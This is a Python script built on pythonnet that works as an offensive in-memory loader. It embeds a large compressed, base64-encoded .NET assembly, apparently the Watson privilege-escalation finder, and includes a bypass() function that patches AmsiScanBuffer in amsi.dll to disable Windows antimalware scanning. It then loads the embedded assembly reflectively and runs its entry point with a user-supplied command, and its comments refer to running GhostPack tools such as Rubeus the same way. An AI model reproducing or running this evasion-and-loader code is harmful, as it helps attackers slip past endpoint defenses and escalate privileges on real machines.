import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Watson.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()